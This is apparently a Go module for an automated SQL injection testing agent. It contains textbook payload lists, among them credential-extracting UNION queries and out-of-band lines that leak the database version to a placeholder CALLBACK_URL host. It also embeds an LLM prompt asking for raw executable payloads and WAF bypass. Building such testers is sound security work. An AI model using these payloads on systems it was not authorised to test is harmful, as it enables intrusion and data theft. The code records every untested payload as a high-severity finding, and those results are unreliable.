// Package sqli implements the SQL Injection specialist agent.
//
// This purely Go-native implementation supports error-based, boolean-blind, time-blind, union-based,
// and out-of-band SQL injection detection.
package sqli

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

// SQLiType categorizes the injection technique.
type SQLiType string

const (
	ErrorBased   SQLiType = "error_based"
	BooleanBlind SQLiType = "boolean_blind"
	TimeBlind    SQLiType = "time_blind"
	UnionBased   SQLiType = "union_based"
	OutOfBand    SQLiType = "out_of_band"
)

// Agent implements the Specialist interface for SQL Injection detection.
type Agent struct {
	systemPrompt string
}

// New creates a new SQLi specialist agent.
func New() *Agent {
	return &Agent{
		systemPrompt: defaultSystemPrompt,
	}
}

func (a *Agent) Name() string         { return "SQLi Agent" }
func (a *Agent) ID() string           { return "sqli" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

// ProcessItem processes a single SQLi work item from the queue.
func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	vulnContext, _ := item.Payload["context"].(string)
	priority, _ := item.Payload["priority"].(string)

	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL in work item")
	}

	// Determine which SQLi techniques to try based on context
	techniques := selectTechniques(vulnContext)

	var findings []*base.Finding
	for _, technique := range techniques {
		payloads := generatePayloads(technique)
		for _, payload := range payloads {
			f := &base.Finding{
				Type:       "SQLi",
				URL:        targetURL,
				Payload:    payload,
				Severity:   mapPriorityToSeverity(priority),
				Confidence: 0.0,
				Evidence: map[string]interface{}{
					"sqli_type": string(technique),
					"dbms_hint": detectDBMS(vulnContext),
				},
				Method: detectMethod(vulnContext),
			}
			findings = append(findings, f)
		}
	}

	return findings, nil
}

// selectTechniques determines which SQLi techniques to try.
func selectTechniques(context string) []SQLiType {
	context = strings.ToLower(context)

	techniques := []SQLiType{ErrorBased} // Always try error-based first

	if strings.Contains(context, "time") || strings.Contains(context, "blind") {
		techniques = append(techniques, TimeBlind)
	}
	if strings.Contains(context, "boolean") || strings.Contains(context, "condition") {
		techniques = append(techniques, BooleanBlind)
	}
	if strings.Contains(context, "union") || strings.Contains(context, "select") {
		techniques = append(techniques, UnionBased)
	}
	if strings.Contains(context, "oob") || strings.Contains(context, "dns") {
		techniques = append(techniques, OutOfBand)
	}

	// Default: try all common techniques
	if len(techniques) == 1 {
		techniques = append(techniques, BooleanBlind, TimeBlind)
	}

	return techniques
}

// generatePayloads creates technique-specific SQLi payloads.
func generatePayloads(technique SQLiType) []string {
	switch technique {
	case ErrorBased:
		return []string{
			`' OR 1=1-- -`,
			`" OR 1=1-- -`,
			`' AND 1=CONVERT(int,(SELECT @@version))-- -`,
			`1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`,
		}
	case BooleanBlind:
		return []string{
			`' AND 1=1-- -`, // True condition
			`' AND 1=2-- -`, // False condition (compare response diff)
			`' AND SUBSTRING(@@version,1,1)='5'-- -`,
		}
	case TimeBlind:
		return []string{
			`' AND SLEEP(5)-- -`,
			`' AND pg_sleep(5)-- -`,
			`'; WAITFOR DELAY '0:0:5'-- -`,
		}
	case UnionBased:
		return []string{
			`' UNION SELECT NULL-- -`,
			`' UNION SELECT NULL,NULL-- -`,
			`' UNION SELECT NULL,NULL,NULL-- -`,
			`' UNION SELECT 1,username,password FROM users-- -`,
		}
	case OutOfBand:
		return []string{
			`' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.CALLBACK_URL\\a'))-- -`,
			`'; EXEC master..xp_dirtree '\\\\CALLBACK_URL\\a'-- -`,
		}
	default:
		return []string{`' OR '1'='1`}
	}
}

// detectDBMS guesses the backend database from context clues.
func detectDBMS(context string) string {
	context = strings.ToLower(context)
	switch {
	case strings.Contains(context, "mysql") || strings.Contains(context, "mariadb"):
		return "mysql"
	case strings.Contains(context, "postgres") || strings.Contains(context, "pg_"):
		return "postgresql"
	case strings.Contains(context, "mssql") || strings.Contains(context, "sqlserver"):
		return "mssql"
	case strings.Contains(context, "oracle"):
		return "oracle"
	case strings.Contains(context, "sqlite"):
		return "sqlite"
	default:
		return "unknown"
	}
}

func detectMethod(context string) string {
	if strings.Contains(strings.ToLower(context), "post") {
		return "POST"
	}
	return "GET"
}

func mapPriorityToSeverity(priority string) string {
	switch strings.ToLower(priority) {
	case "critical":
		return "critical"
	case "high":
		return "high"
	default:
		return "high" // SQLi is always high+ severity
	}
}

const defaultSystemPrompt = `You are an elite SQL Injection specialist with deep expertise in:
- Error-based, Boolean-blind, Time-blind, Union-based, and OOB injection
- DBMS-specific syntax (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
- WAF bypass techniques (comments, encoding, case manipulation)
- Second-order injection and stored procedure exploitation

Your task: Test the provided parameter for SQL injection vulnerabilities.

RULES:
1. Start with error-based detection (fastest confirmation)
2. If error-based fails, try boolean-blind (compare true/false responses)
3. Use time-blind as last resort (SLEEP/pg_sleep/WAITFOR DELAY)
4. Generate ONLY raw, executable payloads
5. Report the DBMS type when identified
6. SQLi is always HIGH or CRITICAL severity`
